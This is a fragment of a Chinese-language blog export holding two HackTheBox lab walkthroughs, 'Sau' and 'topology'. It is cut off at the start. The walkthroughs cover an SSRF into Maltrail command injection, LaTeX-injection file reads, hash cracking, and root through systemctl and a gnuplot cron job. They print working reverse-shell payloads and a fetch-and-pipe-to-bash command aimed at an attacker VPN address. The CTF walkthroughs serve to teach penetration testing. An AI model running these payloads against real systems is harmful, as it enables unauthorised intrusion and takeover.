-sT -O -p22,80 10.10.11.224  Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 21:19 CSTNmap scan report for 10.10.11.224Host is up (0.26s latency).PORT   STATE    SERVICE VERSION22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp filtered httpWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 cloAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux  Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/sNmap done: 1 IP address (1 host up) scanned in 14.87 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/sau]└─$ sudo nmap --script=vuln 10.10.11.224     Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 21:20 CSTNmap scan report for 10.10.11.224Host is up (0.27s latency).Not shown: 997 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    filtered http55555/tcp open     unknownNmap done: 1 IP address (1 host up) scanned in 101.91 seconds\n\nnmap扫完我们发现，80端口以及不知道是啥的8338端口被filtered了，我们访问也是访问不了的，那就是只剩下55555和22端口供我们尝试了。那当然先看55555。\nnikto┌──(kali㉿kali)-[~/HTB/sau]└─$ sudo nikto -h http://10.10.11.224:55555[sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.224+ Target Hostname:    10.10.11.224+ Target Port:        55555+ Start Time:         2023-07-13 09:27:19 (GMT8)---------------------------------------------------------------------------+ Server: No banner retrieved+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Root page / redirects to: /web+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OPTIONS: Allowed HTTP Methods: GET, OPTIONS .+ /local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.+ /access/: This might be interesting.+ /c/: This might be interesting.+ /test/: This might be interesting.+ /a/: May be Kebi Web Mail administration menu. See: CWE-552+ 8076 requests: 0 error(s) and 8 item(s) reported on remote host+ End Time:           2023-07-13 10:14:45 (GMT8) (2846 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n用nikto扫一下也没啥可以利用的东西，接着往下走吧。\nweb渗透访问网站扫描完了，没啥特别多的信息，先看看网页再说。\n\n我们在浏览器访问发现是一个Request Baskets页面。作用是创建一个baskets用于收集和检查HTTP请求。我们手动尝试创建了一下，发现确实他描述的那样。\n那我们怎么利用呢？页面底部告诉了我们Request Baskets的版本号:Powered by request-baskets | Version: 1.2.1 。那我们就谷歌搜一下看看它存不存在什么可以利用的漏洞。\n漏洞利用Request Baskets 利用验证PoC我们搜索一下就可以发现此版本的Request Baskets存在SSRF漏洞，而且还有上交点金手大佬**@beet1e**写的PoC。那我们就按他的PoC说明测试一下吧。\n先利用/api/baskets创建一个basket，我们这里直接利用firefox的重发功能弄了，方便一点。forward_url填自己机子的ip做测试，看看收不收得到服务器发来的请求。\n\n创建完成后我们先开一个nc监听器监听。然后请求一下basket触发一下漏洞。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ curl -v http://10.10.11.224:55555/poc*   Trying 10.10.11.224:55555...* Connected to 10.10.11.224 (10.10.11.224) port 55555 (#0)&gt; GET /poc HTTP/1.1&gt; Host: 10.10.11.224:55555&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; &lt; HTTP/1.1 502 Bad Gateway&lt; Content-Type: text/plain&lt; Date: Thu, 13 Jul 2023 02:20:14 GMT&lt; Content-Length: 133&lt; * Connection #0 to host 10.10.11.224 left intactFailed to forward request: Get http://&lt;HTB_VPN_IP&gt;:443/poc: net/http: HTTP/1.x transport connection broken: malformed HTTP response &quot;&quot; \n\n我们可以发现确实触发了SSRF漏洞，我们接收到了来自服务器端的请求。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ nc -nlvp 443 listening on [any] 443 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.224] 33300GET /poc HTTP/1.1Host: &lt;HTB_VPN_IP&gt;:443User-Agent: curl/7.88.1Accept: */*X-Do-Not-Forward: 1Accept-Encoding: gzip\n\nSSRF利用既然验证存在了SSRF漏洞，我们就要考虑一下如何利用。此处的SSRF漏洞和一般的不太一样，不带什么url参数可供我们读文件啥的。主要是回归SSRF的本质，通过服务器发送请求访问我们原先访问不了的东西。那么首当其冲的就是心心念念的80端口，由于他是filtered了，我们也不知道是被防火墙禁止外网访问还是就是关闭了，我们直接利用SSRF伪造服务器访问80端口并将结果返回给我们就知道了。\n既然利用的思路定下来了那我们接下来改改payload就行。我们先让服务器访问80端口看看是什么情况。还是一样先利用/api/baskets创建baskets。\n&#123;  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,  &quot;proxy_response&quot;: true,  &quot;insecure_tls&quot;: false,  &quot;expand_path&quot;: true,  &quot;capacity&quot;: 250&#125;\n\n然后访问刚创建的baskets。\n\n我们发现给我们返回了80端口网页的内容。虽然很多东西都点不了，但是让我们识别到了80端口在跑的服务：Maltrail v0.53。这个服务又有什么说法呢？\nMaltrail 利用遇事不决查google，我们查一下就可以发现，版本小于0.54的Maltrail存在未授权系统命令注入漏洞。那我们可太喜欢了,这不就意味着我们可以反弹shell嘛。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ curl &#x27;http://10.10.11.224:55555/ssrf/login&#x27; --data &#x27;username=;`id`&#x27; Login failed \n\n直接用给的PoC尝试一下，发现并没有命令回显，只会显示一个login failed。那这到底是能不能成功利用？不过事已至此，死马都得当活马医，本地先开一个nc监听，直接反弹shell试试。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ curl &#x27;http://10.10.11.224:55555/ssrf/login&#x27; --data &#x27;username=;`/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/443 0&gt;&amp;1`&#x27; Login failed  \n\n然而本地nc并没有收到连接。那到底是哪里出了问题呢？难道是反弹shell那里因为编码或者其他问题执行失败了？那我们采用另一种不受编码影响方式反弹看看。我们把/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/443 0&gt;&amp;1写入一个sh文件，然后让服务器请求这个文件。当然本地得开一个简单的web服务器，用python -m http.server就行。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ curl &#x27;http://10.10.11.224:55555/ssrf/login&#x27;  --data &#x27;username=;`curl &lt;HTB_VPN_IP&gt;:8000/exp.sh|bash`&#x27; \n\n这次，我们就收到了我们的反弹shell了。\n┌──(kali㉿kali)-[~/HTB/sau]└─$ nc -nlvp 443listening on [any] 443 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.224] 50012bash: cannot set terminal process group (889): Inappropriate ioctl for devicebash: no job control in this shellpuma@sau:/opt/maltrail$\n\npuma的home目录有user flag。\n提权第一步不用说了sudo -l。\npuma@sau:~$ sudo -lsudo -lMatching Defaults entries for puma on sau:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser puma may run the following commands on sau:    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\n\n这次竟然有东西。惊了。而且systemctl我记得是有利用方式的来着。去gtfobins查一下果然发现有sudo权限的systemctl可以用于提权。\n但是，这时候先别急，如果你直接按照gtfo上的方式c你会发现并进入不了编辑界面，因为此时你尚处于非交互shell。\n所以此时第一件事，也是一种好习惯，就是先用pyhton搞一个交互性更好的shell。\npython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n现在万事俱备，开造就完事。\npuma@sau:/opt/maltrail$ sudo systemctl status trail.servicesudo systemctl status trail.serviceWARNING: terminal is not fully functional-  (press RETURN)!sh!sshh!sh# whoamiwhoamiroot# ididuid=0(root) gid=0(root) groups=0(root)\n\n拿下，root flag在&#x2F;root目录下就有。\n总结这台机子主要考察对SSRF的理解，除了网上常见的教程中的SSRF的利用方式，我们还要记住SSRF本质：伪造从而让服务器发送请求，并将请求的结果返回到本机。这里搞定了其他就没啥问题了。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[HTB]  topology","url":"/2023/07/15/topology/","content":"\n\n\n前言HTB上的topology这台机子其实还挺难的，获取立足点那块真得要点经验。提权这块就相对简单了。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.217Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:45 EDTNmap scan report for topology.htb (10.10.11.217)Host is up (0.096s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 7.81 seconds$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.217Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:45 EDTNmap scan report for topology.htb (10.10.11.217)Host is up (0.074s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Miskatonic University | Topology GroupWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.26 seconds$ sudo nmap --script=vuln 10.10.11.217Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:47 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for topology.htb (10.10.11.217)Host is up (0.079s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-enum:|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.4.41 (ubuntu)&#x27;|_  /images/: Potentially interesting directory w/ listing on &#x27;apache/2.4.41 (ubuntu)&#x27;Nmap done: 1 IP address (1 host up) scanned in 662.23 seconds\n\n开了22和80端口，且80端口跑的是apache部署的网站服务器。简单漏扫也没发现什么可用的结果，接着往下吧。\nnikto$ sudo nikto -h 10.10.11.217- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.217+ Target Hostname:    10.10.11.217+ Target Port:        80+ Start Time:         2023-07-15 04:12:04 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.41 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /: Server may leak inodes via ETags, header found with file /, inode: 1a6f, size: 5f27900124a8b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .+ /css/: Directory indexing found.+ /css/: This might be interesting.+ /images/: Directory indexing found.+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host+ End Time:           2023-07-15 04:23:51 (GMT-4) (707 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nnikto也没什么建树。\nwhatweb$ sudo whatweb http://10.10.11.217http://10.10.11.217 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[lklein@topology.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.217], Title[Miskatonic University | Topology Group]\n\nweb渗透先看看网页。\n\n主页是介绍一个大学的拓扑学研究小组，也不是拿什么常见的CMS搭的。但是在Software projects板块有个链接引起了我们的注意，我们点进去发现并不能正常跳转，我们看浏览器地址栏发现是个子域名，那我们将其加入hosts中，就能成功访问了。\n\n这个网页的功能是将输入的LaTex公式转换成图片。但是先不管这个，俗话说，家里有一只蟑螂就等于有一千只蟑螂，有一个子域名会不会还有别的子域名，生性多疑的我们肯定要探查一二。直接上wufuzz扫一下vhost再说。\n子域名探查wfuzz -H &quot;Host: FUZZ.topology.htb&quot; --hc 404,403 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://topology.htb\n\n出来了好多报200的，很明显这么多不可能都是子域名，那我们屏蔽一下545w个字符数的结果再看看（因为这个返回的最多，多半是不是子域名的结果。）\n$ wfuzz -H &quot;Host: FUZZ.topology.htb&quot; --hc 404,403 --hw 545  -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://topology.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not wor                       k correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://topology.htb/Total requests: 4989=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000019:   401        14 L     54 W       463 Ch      &quot;dev&quot;000000061:   200        5 L      9 W        108 Ch      &quot;stats&quot;Total time: 0Processed Requests: 750Filtered Requests: 748Requests/sec.: 0\n\n这回OK了，返回了我们想要的结果，一个dev和一个stats，网站还有这两个子域名。那我们把他们都加进hosts后一个一个看。\n先看返回200的。\n\n和名字一样，是返回网站状况的。但是有张图不知道为啥没加载出来，但是管他呢，这个页面没什么可以下手的点。\n再看看dev。\n\n上来就找我们要密码，难怪扫描返回401未授权。那看来我们是要想办法搞到这个密码了。先扫扫这个目录看看。\n┌──(meamea㉿racknerd-4565a8)-[~]└─$ sudo dirsearch -u http://dev.topology.htb/  _|. _ _  _  _  _ _|_    v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /root/.dirsearch/reports/dev.topology.htb/-_23-07-14_04-05-47.txtError Log: /root/.dirsearch/logs/errors-23-07-14_04-05-47.logTarget: http://dev.topology.htb/[04:05:47] Starting:[04:05:56] 403 -  281B  - /.ht_wsr.txt[04:05:56] 403 -  281B  - /.htaccess.bak1[04:05:56] 403 -  281B  - /.htaccess_extra[04:05:56] 403 -  281B  - /.htaccess.save[04:05:56] 403 -  281B  - /.htaccess.sample[04:05:56] 403 -  281B  - /.htaccess.orig[04:05:56] 403 -  281B  - /.htaccess_sc[04:05:56] 403 -  281B  - /.htaccess_orig[04:05:56] 403 -  281B  - /.htaccessBAK[04:05:56] 403 -  281B  - /.htaccessOLD[04:05:56] 403 -  281B  - /.htaccessOLD2[04:05:56] 403 -  281B  - /.htm[04:05:56] 403 -  281B  - /.html[04:05:56] 403 -  281B  - /.htpasswd_test[04:05:56] 403 -  281B  - /.htpasswds[04:05:56] 403 -  281B  - /.httr-oauth[04:06:02] 403 -  281B  - /.php\n\n看到好像有/.htpasswds和/.htpasswds_test，一般这种http类型的网页验证很多时候凭证都是存在这些文件或者/.htpasswd文件里面。那么问题来了，目标有了，我们怎么去查看这些文件呢？\nLaTex Injection回想到之前不还有个Latex页面没看嘛。这玩意不知道有什么用就直接问问神奇的谷歌：Latex exploit，就搜到了好多latex injection的利用方式。第一个搜索结果的hacktricks上就写的很详细，我们按他上面的方法试一试。\n可惜事情并没有这么简单，一大串利用方式下来，就没几个能成功的，很多都显示非法命令被检测了。\n\n很显然网站是对Latex命令做了过滤的，并且过滤的还挺多。但是其中，读取文件中一行的内容还是可以的。\n\\newread\\file\\openin\\file=/etc/passwd\\read\\file to\\line\\text&#123;\\line&#125;\\closein\\file\n\n\n如果想多看几行也是可以的。把读行命令重复几遍就行，但是太多的话也不行，网站还对输入长度做了限制。\n\\newread\\file\\openin\\file=/etc/passwd\\read\\file to\\line\\text&#123;\\line&#125;\\read\\file to\\line\\text&#123;\\line&#125;\\read\\file to\\line\\text&#123;\\line&#125;\\read\\file to\\line\\text&#123;\\line&#125;\\closein\\file\n\n\n再长就不行了。那我们试试读/.htpasswds、/.htpasswds_test以及/.htpasswd。发现全部都会报错，不知道为啥…..可能是这样读取文件有问题。\n于是在网上各种找绕过过滤的方式，甚至看了一篇论文《Are Text-Only Data Formats Safe? Or, Use This LATEX Class File to Pwn Your Computer》\n里面提到的几种绕过方式：\n\n\\catcode: 更改字符的类别代码，将X改成转义字符（即’\\‘），然后把X当\\用。\n\\catcode`\\X=0Xinput&#123;/etc/passwd&#125;\n\n^^5c：latex遇到两个^^后会把后面的16进制数作为ASCII值识别，所以^^5c&#x3D;\\。\n\n\\csname input\\endcsname：绕过\\input\n\n\\begin&#123;input&#125;&#123;/etc/passwd&#125;\\end&#123;input&#125;：绕过\\input\n\n\n虽然学习到了很多新姿势，但这些方式都没能成功绕过，都会报错。\n最后查了一下发现了解决方案：数学模式下行内模式（两端加上$$）调用\\lstinputlisting:\n$\\lstinputlisting&#123;/etc/passwd&#125;$\n\n\n可以查看文件全部内容了。那我们再试试/.htpasswds、/.htpasswds_test以及/.htpasswd这几个。发现只有/.htpasswd能读成功。\n\n获取立足点我们直接把其丢进john里面破解一下。\n$sudo john rawpass --wordlist=/usr/share/wordlists/rockyou.txtCreated directory: /root/.johnWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 2 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status**********       (vdaisley)1g 0:00:00:13 DONE (2023-07-15 05:24) 0.07320g/s 72885p/s 72885c/s 72885C/s calebd1..calachoUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed.\n\n成功得到密码。\n我们登陆一下dev看看。\n\n然而这网站啥也没有。那我们试试存不存在凭证复用的情况，我们试试拿凭证去登一下ssh，发现能成功登录。\n$ ssh vdaisley@10.10.11.217vdaisley@10.10.11.217&#x27;s password:Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jul 15 05:05:23 2023 from 10.10.14.187vdaisley@topology:~$ \n\n在home目录下拿到user flag。\n提权老三样sudo -l、find suid bins以及cat crontab一无所获。手动遍历了一下文件也没发现啥特别的。\nlinpeas传统的不行来点电子的。上linpeas。\n╔══════════╣ Unexpected in /opt (usually empty)total 12drwxr-xr-x  3 root root 4096 May 19 13:04 .drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot\n\n我们发现&#x2F;opt下有个文件夹，更奇怪的是这个文件夹只有写和执行权限，不能读。非常奇怪的文件权限设置，事出反常必有妖。我们搜一下gnuplot是干啥的，发现是一个画图的工具，加个exp一查发现了非常多的提权利用方式。我们尝试一下payload。\n#test.pltsystem &quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/HTB-VPN-IP/443 0&gt;&amp;1&#x27;&quot;gnuplot test.plt\n\n本地开一个监听成功收到了反弹shell。然而问题是，只是用户的反弹shell，如何让root执行我们的plt文件呢？而且到底这个gnuplot文件夹是干啥的？\ngunplot exploit我们用pspy64看看有什么进程在执行，多么希望gnuplot在运行（其实肯定在运行，因为之前stats那个图其实就是用gnuplot画的，细想一下的话就有理由怀疑这个文件夹里装的就是gnuplot运行的plt文件）。\n2023/07/15 06:25:01 CMD: UID=0     PID=1335   | /usr/sbin/CRON -f2023/07/15 06:25:01 CMD: UID=0     PID=1340   | /bin/sh -c find &quot;/opt/gnuplot&quot; -name &quot;*.plt&quot; -exec gnuplot &#123;&#125; \\;2023/07/15 06:25:01 CMD: UID=0     PID=1339   | /bin/sh -c find &quot;/opt/gnuplot&quot; -name &quot;*.plt&quot; -exec gnuplot &#123;&#125; \\;2023/07/15 06:25:01 CMD: UID=0     PID=1338   | /usr/sbin/CRON -f2023/07/15 06:25:01 CMD: UID=0     PID=1341   | find /opt/gnuplot -name *.plt -exec gnuplot &#123;&#125; ;2023/07/15 06:25:01 CMD: UID=0     PID=1342   | /bin/sh /opt/gnuplot/getdata.sh2023/07/15 06:25:01 CMD: UID=0     PID=1347   | /usr/sbin/CRON -f\n\n我们可以看到，和预想的一摸一样 ，确实是自动执行gnuplot下的plt文件，那我们直接把payload丢进文件夹中等执行就好。\n$sudo nc -lvp 443listening on [any] 443 ...connect to [HTB-VPN-IP] from topology.htb [10.10.11.217] 34712bash: cannot set terminal process group (94662): Inappropriate ioctl for devicebash: no job control in this shellroot@topology:~# \n\n成功拿到root权限，root flag在&#x2F;root目录下能找到。\n总结这台机子主要考察了在被过滤情况下对Latex命令注入的理解以及对http网页权限验证文件的了解。提权部分比较的简单。\n","categories":["HackTheBox"],"tags":["walkthrough"]}]